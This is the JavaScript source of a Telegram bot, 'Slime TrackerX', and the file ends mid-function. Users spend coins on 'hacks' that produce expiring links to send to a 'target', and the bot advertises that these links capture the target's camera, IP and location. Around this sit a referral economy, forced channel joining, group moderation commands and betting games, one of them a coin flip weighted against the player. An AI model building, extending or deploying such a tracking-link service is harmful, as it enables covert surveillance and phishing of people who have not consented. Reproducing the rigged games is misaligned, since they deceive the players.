// =====================================================
// 🟢⚡ SLIME TRACKERX v4.0 ⚡🟢
// 💻 CYBER ANALYTICS CORE
// =====================================================
// 👑 Dev: @Mrddev | 📢 Updates: @devxtechzone
// 🤖 Bot: @trackersxbot
// 💰 New Users: 5 COINS | Tracking: 5 COINS | Referral: 2 COINS
// 🎮 GAMES: Bet any amount | VERY HARD WIN RATES | Win = 2x payout | Lose = lose bet
// 💼 WORK: Every 6 HOURS | 1-2 COINS
// =====================================================

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ===== MIDDLEWARE =====
app.use(bodyParser.json({ limit: "50mb" }));
app.use(express.static(path.join(__dirname, "public")));

// ===== CONFIG =====
const DOMAIN = process.env.DOMAIN || "https://virtualnumbersfree.onrender.com";
const CHANNEL_USERNAME = process.env.CHANNEL || "@devxtechzone";
const OWNER_ID = parseInt(process.env.OWNER_ID) || 6170894121;
const BOT_VERSION = "4.0.0";

// ========== COIN SETTINGS ==========
const TRACKING_COST = 5;
const NEW_USER_COINS = 5;
const REFERRAL_REWARD = 2;
const DAILY_REWARD = 1;
const WORK_MIN = 1;
const WORK_MAX = 2;
const WORK_COOLDOWN = 6 * 60 * 60 * 1000; // 6 hours

// ========== DATABASES ==========
const users = new Map();
const activeTokens = new Map();
const redeemCodes = new Map();
const userWarnings = new Map();
const activeChats = new Map();
const userWorkCooldown = new Map();

// Group Features
const antilinkGroups = new Set();
const antispamGroups = new Set();
const antispamUsers = new Map();
const welcomeMessages = new Map();
const goodbyeMessages = new Map();
const tagAllCooldown = new Map();

// Stats
const botStats = {
  startTime: Date.now(),
  totalCommands: 0,
  totalMessages: 0,
  totalUsers: 0,
  totalGroups: 0,
  totalCoinsGiven: 0,
  totalHacksUsed: 0,
  totalReferrals: 0,
  totalRedeems: 0
};

const TOKEN_EXPIRY_MS = 10 * 60 * 1000;

// Clean expired tokens
setInterval(() => {
  const now = Date.now();
  for (const [token, data] of activeTokens) {
    if (now - data.createdAt > TOKEN_EXPIRY_MS) {
      activeTokens.delete(token);
    }
  }
}, 60000);

// ========== HELPER FUNCTIONS ==========
function getReferralLink(userId) {
  return `https://t.me/${bot.botInfo?.username || 'trackersxbot'}?start=ref_${userId}`;
}

function formatMessage(text) {
  return text.trim();
}

function generateToken() {
  return crypto.randomBytes(8).toString("hex");
}

async function getUsername(userId) {
  try {
    const chat = await bot.telegram.getChat(userId);
    return chat.username || `User_${userId}`;
  } catch {
    return `User_${userId}`;
  }
}

// ========== INITIALIZE USER ==========
function initUser(userId, referrerId = null) {
  if (!users.has(userId)) {
    const userData = {
      id: userId,
      joinDate: Date.now(),
      lastActive: Date.now(),
      coins: NEW_USER_COINS,
      bank: 0,
      totalEarned: NEW_USER_COINS,
      totalSpent: 0,
      referrals: 0,
      referrer: referrerId,
      usedHacks: 0,
      successfulHacks: 0,
      level: 1,
      xp: 0,
      dailyStreak: 0,
      lastDaily: null,
      gamesPlayed: 0,
      gamesWon: 0,
      gamesLost: 0,
      badges: ["🎁 New User"]
    };
    
    users.set(userId, userData);
    botStats.totalUsers++;
    botStats.totalCoinsGiven += NEW_USER_COINS;
    
    if (referrerId && users.has(referrerId)) {
      const referrer = users.get(referrerId);
      referrer.coins += REFERRAL_REWARD;
      referrer.referrals += 1;
      referrer.totalEarned += REFERRAL_REWARD;
      referrer.badges.push("🌟 Recruiter");
      users.set(referrerId, referrer);
      botStats.totalReferrals++;
      botStats.totalCoinsGiven += REFERRAL_REWARD;
      
      bot.telegram.sendMessage(referrerId, formatMessage(`
🎉 NEW REFERRAL! 🎉

Someone joined using your link!

💰 Reward: +${REFERRAL_REWARD} COINS

📊 Your Stats:
• Total Coins: ${referrer.coins}
• Referrals: ${referrer.referrals}
      `));
    }
  }
  return users.get(userId);
}

function canHack(userId) {
  const user = users.get(userId);
  return user && user.coins >= TRACKING_COST;
}

function useHack(userId) {
  const user = users.get(userId);
  if (user && user.coins >= TRACKING_COST) {
    user.coins -= TRACKING_COST;
    user.usedHacks += 1;
    users.set(userId, user);
    botStats.totalHacksUsed++;
    return true;
  }
  return false;
}

function addCoins(userId, amount, reason) {
  const user = users.get(userId);
  if (user) {
    user.coins += amount;
    user.totalEarned += amount;
    users.set(userId, user);
    botStats.totalCoinsGiven += amount;
    return true;
  }
  return false;
}

function removeCoins(userId, amount, reason) {
  const user = users.get(userId);
  if (user && user.coins >= amount) {
    user.coins -= amount;
    user.totalSpent += amount;
    users.set(userId, user);
    return true;
  }
  return false;
}

function addXP(userId, amount) {
  const user = users.get(userId);
  if (user) {
    user.xp += amount;
    const xpNeeded = user.level * 100;
    
    if (user.xp >= xpNeeded) {
      user.xp -= xpNeeded;
      user.level++;
      const levelReward = user.level * 2;
      user.coins += levelReward;
      
      bot.telegram.sendMessage(userId, formatMessage(`
🎉 LEVEL UP! 🎉

Congratulations! You reached Level ${user.level}!

💰 Reward: +${levelReward} COINS
      `));
    }
    users.set(userId, user);
    return true;
  }
  return false;
}

function generateRedeemCode(coins, maxUses = 20, expiresInHours = 24) {
  const code = crypto.randomBytes(6).toString("hex").toUpperCase();
  redeemCodes.set(code, {
    coins: coins,
    usedBy: [],
    maxUses: Math.min(maxUses, 20),
    remainingUses: Math.min(maxUses, 20),
    createdAt: Date.now(),
    expiresAt: Date.now() + (expiresInHours * 60 * 60 * 1000)
  });
  return code;
}

function redeemCode(userId, code) {
  const codeData = redeemCodes.get(code.toUpperCase());
  if (!codeData) return { success: false, message: "❌ Invalid code!" };
  if (Date.now() > codeData.expiresAt) return { success: false, message: "❌ Code expired!" };
  if (codeData.remainingUses <= 0) return { success: false, message: "❌ Code used up!" };
  if (codeData.usedBy.includes(userId)) return { success: false, message: "❌ Already used!" };
  
  addCoins(userId, codeData.coins, `Redeemed code: ${code}`);
  codeData.usedBy.push(userId);
  codeData.remainingUses--;
  redeemCodes.set(code, codeData);
  botStats.totalRedeems++;
  return { success: true, message: `✅ Redeemed ${codeData.coins} coins!`, coins: codeData.coins };
}

// ========== FORCE JOIN CHECK ==========
async function isUserJoined(ctx) {
  try {
    const member = await ctx.telegram.getChatMember(CHANNEL_USERNAME, ctx.from.id);
    return ["creator", "administrator", "member"].includes(member.status);
  } catch {
    return false;
  }
}

// ========== MENUS ==========
function mainMenu(ctx) {
  const referralLink = getReferralLink(ctx.from.id);
  return Markup.inlineKeyboard([
    [Markup.button.callback("🎯 TRACKING", "tracking_menu"), Markup.button.callback("👑 GROUP", "group_menu")],
    [Markup.button.callback("🎮 GAMES", "games_menu"), Markup.button.callback("💰 ECONOMY", "economy_menu")],
    [Markup.button.callback("🏆 LEADERBOARD", "leaderboard_menu"), Markup.button.callback("👤 PROFILE", "profile")],
    [Markup.button.callback("🎁 REDEEM", "redeem_menu"), Markup.button.callback("🔗 REFERRAL", "referral_info")],
    [Markup.button.url("📢 CHANNEL", "https://t.me/devxtechzone"), Markup.button.url("👨‍💻 DEV", "https://t.me/Mrddev")],
    [Markup.button.url("🔗 MY REFERRAL LINK", referralLink)]
  ]);
}

function trackingMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🎱 POOL TRACKING", "pool"), Markup.button.callback("⚡ NORMAL", "normal")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

function groupMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🔊 TAG ALL", "tagall"), Markup.button.callback("👋 WELCOME", "set_welcome")],
    [Markup.button.callback("👋 GOODBYE", "set_goodbye"), Markup.button.callback("🚫 ANTILINK", "antilink_toggle")],
    [Markup.button.callback("🛡️ ANTISPAM", "antispam_toggle"), Markup.button.callback("⚠️ WARN", "warn_user")],
    [Markup.button.callback("🔨 KICK", "kick_user"), Markup.button.callback("🚫 BAN", "ban_user")],
    [Markup.button.callback("🔇 MUTE", "mute_user"), Markup.button.callback("📊 GROUP STATS", "group_stats")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

function gamesMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("🎲 DICE", "dice_game"), Markup.button.callback("🎰 SLOTS", "slots_game")],
    [Markup.button.callback("🔢 GUESS", "guess_game"), Markup.button.callback("✊ RPS", "rps_game")],
    [Markup.button.callback("🪙 COIN FLIP", "coinflip"), Markup.button.callback("🔥 HIGH RISK", "high_risk")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

function economyMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("💰 DAILY", "daily"), Markup.button.callback("💼 WORK", "work")],
    [Markup.button.callback("🏆 LEADERBOARD", "coin_leaderboard"), Markup.button.callback("🎁 REFERRAL", "referral_info")],
    [Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

function leaderboardMenu() {
  return Markup.inlineKeyboard([
    [Markup.button.callback("💰 COINS", "leaderboard_coins"), Markup.button.callback("🎮 GAMES", "leaderboard_games")],
    [Markup.button.callback("👥 REFERRALS", "leaderboard_referrals"), Markup.button.callback("⭐ LEVEL", "leaderboard_level")],
    [Markup.button.callback("🔧 TOP HACKERS", "leaderboard_hacks"), Markup.button.callback("◀️ BACK", "main_back")]
  ]);
}

// ========== MIDDLEWARE ==========
bot.use(async (ctx, next) => {
  if (!ctx.from || !ctx.chat || ctx.chat.type === "channel") return;
  if (ctx.callbackQuery && ctx.callbackQuery.data === "check_join") return next();
  
  const joined = await isUserJoined(ctx);
  if (!joined) {
    return ctx.telegram.sendMessage(ctx.from.id, formatMessage(`
🚫 ACCESS LOCKED

🔐 You must join our channel first!

👇 Click below to join
    `), {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📢 JOIN CHANNEL", url: "https://t.me/devxtechzone" }],
          [{ text: "✅ I JOINED", callback_data: "check_join" }]
        ]
      }
    });
  }
  return next();
});

// ========== START COMMAND ==========
bot.start(async (ctx) => {
  let referrerId = null;
  const args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) {
    referrerId = parseInt(args[1].replace("ref_", ""));
    if (isNaN(referrerId)) referrerId = null;
  }
  
  const user = initUser(ctx.from.id, referrerId);
  const referralLink = getReferralLink(ctx.from.id);
  
  await ctx.replyWithPhoto("https://files.catbox.moe/v75lmb.jpeg", {
    caption: formatMessage(`
🟢⚡ SLIME TRACKERX ⚡🟢
💻 CYBER ANALYTICS CORE

✨ Welcome ${ctx.from.first_name}!

💰 Balance: ${user.coins} coins
📊 Level: ${user.level}
👥 Referrals: ${user.referrals}

🎁 You got ${NEW_USER_COINS} FREE coins!

━━━━━━━━━━━━━━━━━━━━━━━━━

🔗 Your Referral Link:
${referralLink}

Share this link - earn ${REFERRAL_REWARD} coins per referral!

━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 Select a module below
    `),
    parse_mode: "HTML",
    ...mainMenu(ctx)
  });
});

bot.action("check_join", async (ctx) => {
  const joined = await isUserJoined(ctx);
  if (!joined) {
    return ctx.answerCbQuery("❌ Join channel first!", { show_alert: true });
  }
  await ctx.answerCbQuery("✅ Access Granted! 🎉");
  await ctx.deleteMessage();
  
  const user = initUser(ctx.from.id);
  await ctx.replyWithPhoto("https://files.catbox.moe/v75lmb.jpeg", {
    caption: formatMessage(`
✅ Access Unlocked!

💰 Balance: ${user.coins} coins

🎯 Select a module below
    `),
    parse_mode: "HTML",
    ...mainMenu(ctx)
  });
});

// ========== MENU NAVIGATION ==========
bot.action("tracking_menu", async (ctx) => {
  try {
    await ctx.editMessageCaption("🎯 TRACKING MODULE\n\n⚠️ Cost: 5 coins per hack\n⏱️ Token expires in 10 minutes\n📸 Captures: Camera + IP + Location", {
      parse_mode: "HTML",
      ...trackingMenu()
    });
  } catch (err) {
    await ctx.reply("🎯 TRACKING MODULE\n\n⚠️ Cost: 5 coins per hack\n⏱️ Token expires in 10 minutes\n📸 Captures: Camera + IP + Location", {
      parse_mode: "HTML",
      ...trackingMenu()
    });
  }
});

bot.action("group_menu", async (ctx) => {
  try {
    await ctx.editMessageCaption("👑 GROUP MANAGEMENT\n\nAdmin tools for group moderation!", {
      parse_mode: "HTML",
      ...groupMenu()
    });
  } catch (err) {
    await ctx.reply("👑 GROUP MANAGEMENT\n\nAdmin tools for group moderation!", {
      parse_mode: "HTML",
      ...groupMenu()
    });
  }
});

bot.action("games_menu", async (ctx) => {
  try {
    await ctx.editMessageCaption("🎮 GAMES ZONE\n\n💰 Bet any amount you want!\n⚠️ VERY HARD to win!\n🎯 Win = 2x your bet | Lose = lose your bet", {
      parse_mode: "HTML",
      ...gamesMenu()
    });
  } catch (err) {
    await ctx.reply("🎮 GAMES ZONE\n\n💰 Bet any amount you want!\n⚠️ ENJOY !\n🎯 Win = 2x your bet | Lose = lose your bet", {
      parse_mode: "HTML",
      ...gamesMenu()
    });
  }
});

bot.action("economy_menu", async (ctx) => {
  const user = initUser(ctx.from.id);
  try {
    await ctx.editMessageCaption(formatMessage(`
💰 ECONOMY SYSTEM

💰 Your Balance: ${user.coins} coins
📈 Total Earned: ${user.totalEarned}

💰 Earning Methods:
• Daily reward - ${DAILY_REWARD} coin
• Work - ${WORK_MIN}-${WORK_MAX} coins (every 6 hours)
• Referrals - ${REFERRAL_REWARD} coins each
• Games - Bet any amount (VERY HARD to win)
• Redeem codes

⬇️ Select option:
  `), { parse_mode: "HTML", ...economyMenu() });
  } catch (err) {
    await ctx.reply(formatMessage(`
💰 ECONOMY SYSTEM

💰 Your Balance: ${user.coins} coins
📈 Total Earned: ${user.totalEarned}

💰 Earning Methods:
• Daily reward - ${DAILY_REWARD} coin
• Work - ${WORK_MIN}-${WORK_MAX} coins (every 6 hours)
• Referrals - ${REFERRAL_REWARD} coins each
• Games - Bet any amount (VERY HARD to win)
• Redeem codes

⬇️ Select option:
  `), { parse_mode: "HTML", ...economyMenu() });
  }
});

bot.action("leaderboard_menu", async (ctx) => {
  try {
    await ctx.editMessageCaption("🏆 LEADERBOARDS\n\nView top users across different categories!", {
      parse_mode: "HTML",
      ...leaderboardMenu()
    });
  } catch (err) {
    await ctx.reply("🏆 LEADERBOARDS\n\nView top users across different categories!", {
      parse_mode: "HTML",
      ...leaderboardMenu()
    });
  }
});

bot.action("main_back", async (ctx) => {
  const user = initUser(ctx.from.id);
  try {
    await ctx.editMessageCaption(formatMessage(`
🟢⚡ SLIME TRACKERX ⚡🟢
💻 CYBER ANALYTICS CORE

💰 Balance: ${user.coins} coins
📊 Level: ${user.level}
👥 Referrals: ${user.referrals}

🎯 Select a module below
  `), { parse_mode: "HTML", ...mainMenu(ctx) });
  } catch (err) {
    await ctx.reply(formatMessage(`
🟢⚡ SLIME TRACKERX ⚡🟢
💻 CYBER ANALYTICS CORE

💰 Balance: ${user.coins} coins
📊 Level: ${user.level}
👥 Referrals: ${user.referrals}

🎯 Select a module below
  `), { parse_mode: "HTML", ...mainMenu(ctx) });
  }
});

// ========== TRACKING ==========
bot.action("pool", async (ctx) => {
  if (!canHack(ctx.from.id)) {
    return ctx.reply(formatMessage(`
❌ Insufficient Coins!

You need ${TRACKING_COST} coins to use tracking.
Current balance: ${users.get(ctx.from.id)?.coins || 0} coins

🎁 Ways to earn coins:
• Daily reward - ${DAILY_REWARD} coin
• Work - ${WORK_MIN}-${WORK_MAX} coins (every 6 hours)
• Referrals - ${REFERRAL_REWARD} coins each
• Redeem codes
• Play games - Bet any amount (VERY HARD to win)
    `));
  }
  
  useHack(ctx.from.id);
  const token = generateToken();
  
  activeTokens.set(token, {
    chatId: ctx.chat.id,
    userId: ctx.from.id,
    createdAt: Date.now()
  });
  
  setTimeout(() => activeTokens.delete(token), TOKEN_EXPIRY_MS);
  
  await ctx.reply(formatMessage(`
🎱 POOL MODE ACTIVE

✅ Tracking initialized!
💰 Coins deducted: -${TRACKING_COST}
⏱️ Token expires in: 10 minutes

Share this link with target:
${DOMAIN}?token=${token}

⚠️ Link expires in 10 minutes!
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("◀️ BACK", "tracking_menu")]
  ]) });
});

bot.action("normal", async (ctx) => {
  if (!canHack(ctx.from.id)) {
    return ctx.reply(formatMessage(`
❌ Insufficient Coins!

You need ${TRACKING_COST} coins to use tracking.
Current balance: ${users.get(ctx.from.id)?.coins || 0} coins
    `));
  }
  
  useHack(ctx.from.id);
  const token = generateToken();
  
  activeTokens.set(token, {
    chatId: ctx.chat.id,
    userId: ctx.from.id,
    createdAt: Date.now()
  });
  
  setTimeout(() => activeTokens.delete(token), TOKEN_EXPIRY_MS);
  
  await ctx.reply(formatMessage(`
⚡ NORMAL MODE ACTIVE

✅ Tracking initialized!
💰 Coins deducted: -${TRACKING_COST}
⏱️ Token expires in: 10 minutes

Share this link:
${DOMAIN}?token=${token}
  `), { parse_mode: "HTML", ...Markup.inlineKeyboard([
    [Markup.button.callback("◀️ BACK", "tracking_menu")]
  ]) });
});

// ========== GAMES - BET ANY AMOUNT, VERY HARD TO WIN ==========

// DICE GAME - Only 16% win rate (1 in 6 chance)
bot.action("dice_game", async (ctx) => {
  await ctx.reply(formatMessage(`
🎲 DICE GAME

💰 Bet any amount you want!
🎯 Win = 2x your bet | Lose = lose your bet

Use: /dice <amount>

Example: /dice 10
  `));
});

bot.command("dice", async (ctx) => {
  const user = initUser(ctx.from.id);
  const args = ctx.message.text.split(" ");
  const bet = parseInt(args[1]);
  
  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /dice <amount>\nExample: /dice 10");
  if (user.coins < bet) return ctx.reply(`❌ You don't have ${bet} coins! You have ${user.coins} coins.`);
  
  removeCoins(ctx.from.id, bet, "Dice bet");
  const roll = Math.floor(Math.random() * 6) + 1;
  const win = roll === 6; // Only 1 in 6 chance (16.6%)
  
  if (win) {
    const winnings = bet * 2;
    addCoins(ctx.from.id, winnings, "Won dice game");
    user.gamesWon++;
    await ctx.replyWithDice();
    await ctx.reply(`🎲 You rolled ${roll} and WON!\n💰 You won ${winnings} coins!`);
  } else {
    await ctx.replyWithDice();
    await ctx.reply(`🎲 You rolled ${roll} and LOST!\n💸 You lost ${bet} coins!`);
    user.gamesLost++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

// SLOTS GAME - Very low win rates
bot.action("slots_game", async (ctx) => {
  await ctx.reply(formatMessage(`
🎰 SLOTS GAME

💰 Bet any amount you want!
🎯 Jackpot = 10x | Pair = 2x | Lose = lose bet

Use: /slots <amount>

Example: /slots 10
  `));
});

bot.command("slots", async (ctx) => {
  const user = initUser(ctx.from.id);
  const args = ctx.message.text.split(" ");
  const bet = parseInt(args[1]);
  
  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /slots <amount>\nExample: /slots 10");
  if (user.coins < bet) return ctx.reply(`❌ You don't have ${bet} coins! You have ${user.coins} coins.`);
  
  removeCoins(ctx.from.id, bet, "Slots bet");
  
  const slots = ["🍒", "🍊", "🍋", "🍉", "⭐", "💎"];
  const result = [
    slots[Math.floor(Math.random() * slots.length)],
    slots[Math.floor(Math.random() * slots.length)],
    slots[Math.floor(Math.random() * slots.length)]
  ];
  
  const isJackpot = result[0] === result[1] && result[1] === result[2];
  const isPair = !isJackpot && (result[0] === result[1] || result[1] === result[2] || result[0] === result[2]);
  
  let winnings = 0;
  let message = "";
  
  if (isJackpot) {
    winnings = bet * 10;
    message = `🎰 JACKPOT! ${result.join(" ")}\n💰 You won ${winnings} coins!`;
  } else if (isPair) {
    winnings = bet * 2;
    message = `🎰 Pair! ${result.join(" ")}\n💰 You won ${winnings} coins!`;
  } else {
    message = `🎰 ${result.join(" ")}\n💸 You lost ${bet} coins!`;
    user.gamesLost++;
  }
  
  if (winnings > 0) {
    addCoins(ctx.from.id, winnings, "Won slots");
    user.gamesWon++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
  await ctx.reply(message);
});

// GUESS GAME - 10% chance
bot.action("guess_game", async (ctx) => {
  await ctx.reply(formatMessage(`
🔢 GUESS GAME

💰 Bet any amount you want!
🎯 Guess number 1-10 | Win = 5x your bet | Lose = lose bet

Use: /guess <amount> <number>

Example: /guess 10 7
  `));
});

bot.command("guess", async (ctx) => {
  const user = initUser(ctx.from.id);
  const args = ctx.message.text.split(" ");
  const bet = parseInt(args[1]);
  const guess = parseInt(args[2]);
  const number = Math.floor(Math.random() * 10) + 1;
  
  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /guess <amount> <number 1-10>\nExample: /guess 10 7");
  if (isNaN(guess) || guess < 1 || guess > 10) return ctx.reply("Guess a number between 1-10!");
  if (user.coins < bet) return ctx.reply(`❌ You don't have ${bet} coins! You have ${user.coins} coins.`);
  
  removeCoins(ctx.from.id, bet, "Guess game");
  
  if (guess === number) {
    const winnings = bet * 5;
    addCoins(ctx.from.id, winnings, "Won guess game");
    user.gamesWon++;
    await ctx.reply(`🎉 Correct! The number was ${number}! You won ${winnings} coins!`);
  } else {
    await ctx.reply(`❌ Wrong! The number was ${number}. You lost ${bet} coins!`);
    user.gamesLost++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

// RPS GAME - 33% win rate
bot.action("rps_game", async (ctx) => {
  await ctx.reply(formatMessage(`
✊ ROCK PAPER SCISSORS

💰 Bet any amount you want!
🎯 Win = 2x your bet | Lose = lose bet | Tie = coins back

Use: /rps <amount> <rock/paper/scissors>

Example: /rps 10 rock
  `));
});

bot.command("rps", async (ctx) => {
  const user = initUser(ctx.from.id);
  const args = ctx.message.text.split(" ");
  const bet = parseInt(args[1]);
  const choice = args[2]?.toLowerCase();
  
  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /rps <amount> <rock/paper/scissors>\nExample: /rps 10 rock");
  if (!["rock", "paper", "scissors"].includes(choice)) return ctx.reply("Choose rock, paper, or scissors!");
  if (user.coins < bet) return ctx.reply(`❌ You don't have ${bet} coins! You have ${user.coins} coins.`);
  
  const botChoice = ["rock", "paper", "scissors"][Math.floor(Math.random() * 3)];
  let result;
  
  if (choice === botChoice) result = "tie";
  else if (
    (choice === "rock" && botChoice === "scissors") ||
    (choice === "paper" && botChoice === "rock") ||
    (choice === "scissors" && botChoice === "paper")
  ) result = "win";
  else result = "lose";
  
  removeCoins(ctx.from.id, bet, "RPS game");
  
  if (result === "win") {
    const winnings = bet * 2;
    addCoins(ctx.from.id, winnings, "Won RPS");
    user.gamesWon++;
    await ctx.reply(`✊ You chose ${choice}, I chose ${botChoice}!\n🎉 You WIN! +${winnings} coins!`);
  } else if (result === "lose") {
    await ctx.reply(`✊ You chose ${choice}, I chose ${botChoice}!\n💸 You LOSE! -${bet} coins!`);
    user.gamesLost++;
  } else {
    await ctx.reply(`✊ You chose ${choice}, I chose ${botChoice}!\n🤝 It's a TIE! Coins returned.`);
    addCoins(ctx.from.id, bet, "RPS tie");
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

// COIN FLIP - 40% win rate
bot.action("coinflip", async (ctx) => {
  await ctx.reply(formatMessage(`
🪙 COIN FLIP

💰 Bet any amount you want!
🎯 Win = 2x your bet | Lose = lose bet

Use: /flip <amount>

Example: /flip 10
  `));
});

bot.command("flip", async (ctx) => {
  const user = initUser(ctx.from.id);
  const args = ctx.message.text.split(" ");
  const bet = parseInt(args[1]);
  
  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /flip <amount>\nExample: /flip 10");
  if (user.coins < bet) return ctx.reply(`❌ You don't have ${bet} coins! You have ${user.coins} coins.`);
  
  removeCoins(ctx.from.id, bet, "Coin flip bet");
  const flip = Math.random() < 0.4 ? "HEADS" : "TAILS";
  const win = flip === "HEADS";
  
  if (win) {
    const winnings = bet * 2;
    addCoins(ctx.from.id, winnings, "Won coin flip");
    user.gamesWon++;
    await ctx.reply(`🪙 Coin landed on ${flip}!\n🎉 You WIN! +${winnings} coins!`);
  } else {
    await ctx.reply(`🪙 Coin landed on ${flip}!\n💸 You LOST! -${bet} coins!`);
    user.gamesLost++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

// HIGH RISK GAME - 20% win rate, 10x payout
bot.action("high_risk", async (ctx) => {
  await ctx.reply(formatMessage(`
🔥 HIGH RISK GAME

💰 Bet any amount you want!
🎯 Win = 10x your bet | Lose = lose bet

Use: /risk <amount>

Example: /risk 10
  `));
});

bot.command("risk", async (ctx) => {
  const user = initUser(ctx.from.id);
  const args = ctx.message.text.split(" ");
  const bet = parseInt(args[1]);
  
  if (isNaN(bet) || bet < 1) return ctx.reply("❌ Usage: /risk <amount>\nExample: /risk 10");
  if (user.coins < bet) return ctx.reply(`❌ You don't have ${bet} coins! You have ${user.coins} coins.`);
  
  removeCoins(ctx.from.id, bet, "High risk bet");
  const win = Math.random() < 0.2;
  
  if (win) {
    const winnings = bet * 10;
    addCoins(ctx.from.id, winnings, "Won high risk game");
    user.gamesWon++;
    await ctx.reply(`🔥 HIGH RISK - YOU WON!\n💰 You won ${winnings} coins!`);
  } else {
    await ctx.reply(`💀 HIGH RISK - YOU LOST!\n💸 You lost ${bet} coins!`);
    user.gamesLost++;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

// ========== ECONOMY ==========
bot.action("daily", async (ctx) => {
  const user = initUser(ctx.from.id);
  const now = Date.now();
  const dayInMs = 24 * 60 * 60 * 1000;
  
  if (user.lastDaily && (now - user.lastDaily) < dayInMs) {
    const remaining = dayInMs - (now - user.lastDaily);
    const hours = Math.floor(remaining / 3600000);
    return ctx.reply(`⏰ Daily reward already claimed! Come back in ${hours} hours.`);
  }
  
  let streak = user.dailyStreak || 0;
  if (user.lastDaily && (now - user.lastDaily) < dayInMs * 2) {
    streak++;
  } else {
    streak = 1;
  }
  
  const bonus = Math.min(streak, 10);
  const totalReward = DAILY_REWARD + bonus;
  
  addCoins(ctx.from.id, totalReward, "Daily reward");
  user.dailyStreak = streak;
  user.lastDaily = now;
  users.set(ctx.from.id, user);
  
  await ctx.reply(formatMessage(`
🎁 DAILY REWARD! 🎁

💰 You received: +${totalReward} COINS

📊 Breakdown:
• Base: ${DAILY_REWARD}
• Streak Bonus: +${bonus}

🔥 Current Streak: ${streak} day(s)

💎 New Balance: ${user.coins + totalReward} coins

Come back tomorrow for more!
  `));
});

bot.action("work", async (ctx) => {
  const userId = ctx.from.id;
  const now = Date.now();
  const lastWork = userWorkCooldown.get(userId) || 0;
  
  if (now - lastWork < WORK_COOLDOWN) {
    const remaining = WORK_COOLDOWN - (now - lastWork);
    const hours = Math.floor(remaining / 3600000);
    const minutes = Math.floor((remaining % 3600000) / 60000);
    return ctx.reply(`⏰ You're tired! Rest for ${hours}h ${minutes}m before working again.`);
  }
  
  const jobs = ["💻 Developer", "🎨 Designer", "📝 Writer", "🎮 Gamer", "🛒 Shopper", "🍕 Delivery", "📚 Teacher", "🔧 Mechanic"];
  const job = jobs[Math.floor(Math.random() * jobs.length)];
  const reward = Math.floor(Math.random() * (WORK_MAX - WORK_MIN + 1) + WORK_MIN);
  
  addCoins(userId, reward, `Worked as ${job}`);
  userWorkCooldown.set(userId, now);
  
  await ctx.reply(formatMessage(`
💼 WORK COMPLETE! 💼

👔 Job: ${job}
💰 Payment: +${reward} COINS

💎 New Balance: ${users.get(userId).coins} coins

Come back in 6 hours for another shift!
  `));
});

// ========== LEADERBOARDS WITH USERNAMES ==========
bot.action("leaderboard_coins", async (ctx) => {
  const topUsers = Array.from(users.values()).sort((a, b) => b.coins - a.coins).slice(0, 10);
  let message = "🏆 **💰 RICHEST USERS** 🏆\n\n";
  
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    const username = await getUsername(user.id);
    message += `${medal} @${username} - ${user.coins} coins\n`;
  }
  
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("leaderboard_games", async (ctx) => {
  const topUsers = Array.from(users.values()).sort((a, b) => b.gamesWon - a.gamesWon).slice(0, 10);
  let message = "🏆 **🎮 TOP GAMERS** 🏆\n\n";
  
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    const username = await getUsername(user.id);
    message += `${medal} @${username} - ${user.gamesWon} wins\n`;
  }
  
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("leaderboard_referrals", async (ctx) => {
  const topUsers = Array.from(users.values()).sort((a, b) => b.referrals - a.referrals).slice(0, 10);
  let message = "🏆 **👥 TOP REFERRERS** 🏆\n\n";
  
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    const username = await getUsername(user.id);
    message += `${medal} @${username} - ${user.referrals} referrals\n`;
  }
  
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("leaderboard_level", async (ctx) => {
  const topUsers = Array.from(users.values()).sort((a, b) => b.level - a.level).slice(0, 10);
  let message = "🏆 **⭐ TOP LEVELS** 🏆\n\n";
  
  for (let i = 0; i < topUsers.length; i++) {
    const user = topUsers[i];
    const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : "📌";
    const username = await getUsername(user.id);
    message += `${medal} @${username} - Level ${user.level}\n`;
  }
  
  await ctx.reply(message, { parse_mode: "Markdown" });
});

bot.action("leaderboard_hacks", async (ctx) => {
  const topUsers = Array.from(users.values()).sort((a, b) => b.usedHacks - a.usedHacks).slice(0, 10);
  let message = "🏆 **🔧 TOP HACKERS** 🏆\n\n";
  
  for (let i = 0; i < topUsers.length; i++) {
